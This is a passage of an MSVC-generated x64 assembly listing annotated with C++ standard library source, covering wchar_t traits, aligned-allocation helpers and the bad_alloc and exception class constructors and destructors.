	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 270  :         // look for _Ch in [_First, _First + _Count)
; 271  : #if _HAS_CXX17
; 272  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 273  :             return __builtin_wmemchr(_First, _Ch, _Count);
; 274  :         } else {
; 275  :             return _Primary_char_traits::find(_First, _Count, _Ch);
; 276  :         }
; 277  : #else // _HAS_CXX17
; 278  :         return reinterpret_cast<const _Elem*>(_CSTD wmemchr(reinterpret_cast<const wchar_t*>(_First), _Ch, _Count));

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rax, QWORD PTR _Ch$[rsp]
	movzx	edx, WORD PTR [rax]
	mov	rcx, QWORD PTR _First$[rsp]
	call	wmemchr

; 279  : #endif // _HAS_CXX17
; 280  :     }

	add	rsp, 40					; 00000028H
	ret	0
?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z ENDP ; std::_WChar_traits<wchar_t>::find
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 48
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // _HAS_CXX17
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

	mov	rcx, QWORD PTR _First$[rsp]
	call	wcslen

; 265  : #endif // _HAS_CXX17
; 266  :     }

	add	rsp, 40					; 00000028H
	ret	0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z PROC	; std::_WChar_traits<wchar_t>::compare, COMDAT

; 241  :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 242  :         // compare [_First1, _First1 + _Count) with [_First2, ...)
; 243  : #if _HAS_CXX17
; 244  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 245  :             return __builtin_wmemcmp(_First1, _First2, _Count);
; 246  :         } else {
; 247  :             return _Primary_char_traits::compare(_First1, _First2, _Count);
; 248  :         }
; 249  : #else // _HAS_CXX17
; 250  :         return _CSTD wmemcmp(

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	wmemcmp

; 251  :             reinterpret_cast<const wchar_t*>(_First1), reinterpret_cast<const wchar_t*>(_First2), _Count);
; 252  : #endif // _HAS_CXX17
; 253  :     }

	add	rsp, 40					; 00000028H
	ret	0
?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z ENDP	; std::_WChar_traits<wchar_t>::compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^ / vvv !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

	mov	rax, QWORD PTR _Count$[rsp]
	shl	rax, 1
	mov	r8, rax
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

	mov	rax, QWORD PTR _First1$[rsp]

; 121  :     }

	add	rsp, 40					; 00000028H
	ret	0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^ / vvv !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap; see LWG-3085
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rax, QWORD PTR _Count$[rsp]
	shl	rax, 1
	mov	r8, rax
	mov	rdx, QWORD PTR _First2$[rsp]
	mov	rcx, QWORD PTR _First1$[rsp]
	call	memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

	mov	rax, QWORD PTR _First1$[rsp]

; 68   :     }

	add	rsp, 40					; 00000028H
	ret	0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1297 :     _CONSTEXPR20 void _Release() noexcept {}

	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
__formal$ = 24
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1294 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Adopt@_Iterator_base0@std@@QEAAXPEBX@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
?_Adopt@_Iterator_base0@std@@QEAAXPEBX@Z PROC		; std::_Iterator_base0::_Adopt, COMDAT

; 1033 :     _CONSTEXPR20 void _Adopt(const void*) noexcept {}

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Adopt@_Iterator_base0@std@@QEAAXPEBX@Z ENDP		; std::_Iterator_base0::_Adopt
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1028 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z PROC ; std::_Container_base0::_Swap_proxy_and_iterators, COMDAT

; 1027 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(_Container_base0&) noexcept {}

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ENDP ; std::_Container_base0::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1026 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Back_shift$ = 32
_Ptr_container$ = 40
_Ptr_user$ = 48
_Min_back_shift$ = 56
_Ptr$ = 80
_Bytes$ = 88
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 147  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN11:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 148  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 149  :     _Bytes += _Non_user_size;

	mov	rax, QWORD PTR _Bytes$[rsp]
	mov	rax, QWORD PTR [rax]
	add	rax, 39					; 00000027H
	mov	rcx, QWORD PTR _Bytes$[rsp]
	mov	QWORD PTR [rcx], rax

; 150  : 
; 151  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Ptr_user$[rsp], rax

; 152  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	eax, 8
	imul	rax, rax, -1
	mov	rcx, QWORD PTR _Ptr_user$[rsp]
	mov	rax, QWORD PTR [rcx+rax]
	mov	QWORD PTR _Ptr_container$[rsp], rax

; 153  : 
; 154  :     // If the following asserts, it likely means that we are performing
; 155  :     // an aligned delete on memory coming from an unaligned allocation.
; 156  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 157  : 
; 158  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 159  :     // in range [_Min_back_shift, _Non_user_size]
; 160  : #ifdef _DEBUG
; 161  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 162  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 163  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

	mov	QWORD PTR _Min_back_shift$[rsp], 8

; 164  : #endif // _DEBUG
; 165  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR _Ptr_container$[rsp]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	QWORD PTR _Back_shift$[rsp], rax
$LN4@Adjust_man:

; 166  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	cmp	QWORD PTR _Back_shift$[rsp], 8
	jb	SHORT $LN8@Adjust_man
	cmp	QWORD PTR _Back_shift$[rsp], 39		; 00000027H
	ja	SHORT $LN8@Adjust_man
	jmp	SHORT $LN9@Adjust_man
$LN8@Adjust_man:
$LN7@Adjust_man:
	call	_invalid_parameter_noinfo_noreturn
	xor	eax, eax
	test	eax, eax
	jne	SHORT $LN7@Adjust_man
$LN9@Adjust_man:
	xor	eax, eax
	test	eax, eax
	jne	SHORT $LN4@Adjust_man

; 167  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR _Ptr_container$[rsp]
	mov	QWORD PTR [rax], rcx
$LN10@Adjust_man:

; 168  : }

	add	rsp, 72					; 00000048H
	ret	0
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 48
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 78   :         void* _Allocate(const size_t _Bytes) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 79   :         return ::operator new(_Bytes);

	mov	rcx, QWORD PTR _Bytes$[rsp]
	call	??2@YAPEAX_K@Z				; operator new

; 80   :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 642  :         return LLONG_MAX;

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 643  :     }

	ret	0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\exception
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 32
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 323  : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
	sub	rsp, 72					; 00000048H

; 324  :     _THROW(bad_array_new_length{});

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0bad_array_new_length@std@@QEAA@XZ	; std::bad_array_new_length::bad_array_new_length
	lea	rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
	lea	rcx, QWORD PTR $T1[rsp]
	call	_CxxThrowException
$LN2@Throw_bad_:

; 325  : }

	add	rsp, 72					; 00000048H
	ret	0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1bad_array_new_length@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 24
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0bad_alloc@std@@QEAA@AEBV01@@Z
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1bad_alloc@std@@UEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 140  :         : bad_alloc("bad array new length")

	lea	rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
	mov	rcx, QWORD PTR this$[rsp]
	call	??0bad_alloc@std@@AEAA@QEBD@Z		; std::bad_alloc::bad_alloc

; 141  :     {

	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
	mov	QWORD PTR [rax], rcx

; 142  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1bad_alloc@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 24
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@AEBV01@@Z	; std::exception::exception
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1exception@std@@UEAA@XZ		; std::exception::~exception
	add	rsp, 40					; 00000028H
	ret	0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 48
_Message$ = 56
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 129  :         : exception(_Message, 1)

	mov	r8d, 1
	mov	rdx, QWORD PTR _Message$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@QEBDH@Z		; std::exception::exception

; 130  :     {

	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
	mov	QWORD PTR [rax], rcx

; 131  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1exception@std@@UEAA@XZ		; std::exception::~exception
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 24
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 0
this$ = 32
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+8], 0
	je	SHORT $LN3@what
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	QWORD PTR tv69[rsp], rax
	jmp	SHORT $LN4@what
$LN3@what:
	lea	rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
	mov	QWORD PTR tv69[rsp], rax
$LN4@what:
	mov	rax, QWORD PTR tv69[rsp]

; 96   :     }

	add	rsp, 24
	ret	0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7exception@std@@6B@
	mov	QWORD PTR [rax], rcx

